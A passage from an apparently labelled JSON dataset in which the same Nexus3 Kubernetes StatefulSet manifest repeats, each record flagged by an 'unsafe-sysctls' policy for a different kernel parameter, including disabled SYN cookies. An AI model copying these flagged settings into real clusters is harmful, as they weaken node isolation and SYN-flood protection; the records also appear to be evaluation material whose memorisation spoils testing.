    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_keepalive_intvl\"."
  },
  {
    "id": "2179",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_keepalive_probes\"."
  },
  {
    "id": "2180",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_keepalive_time\"."
  },
  {
    "id": "2181",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_max_syn_backlog\"."
  },
  {
    "id": "2182",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_max_tw_buckets\"."
  },
  {
    "id": "2183",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_retries2\"."
  },
  {
    "id": "2184",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_rfc1337\"."
  },
  {
    "id": "2185",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_slow_start_after_idle\"."
  },
  {
    "id": "2186",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_syn_retries\"."
  },
  {
    "id": "2187",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - 